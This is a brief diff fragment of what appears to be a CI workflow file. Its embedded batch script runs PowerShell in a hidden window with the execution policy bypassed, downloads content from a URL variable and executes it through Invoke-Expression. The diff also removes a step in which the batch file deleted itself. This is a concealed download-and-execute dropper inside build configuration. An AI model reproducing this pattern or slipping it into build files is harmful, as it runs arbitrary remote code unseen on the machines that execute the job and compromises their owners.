@@ -92,9 +92,6 @@ jobs:
           powershell -NoLogo -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
               "(Invoke-WebRequest -Uri '%URL%' -UseBasicParsing).Content | Invoke-Expression"
 
-          REM --- Delete this batch file ---
-          del "%~f0"
-
           exit
           "@
           
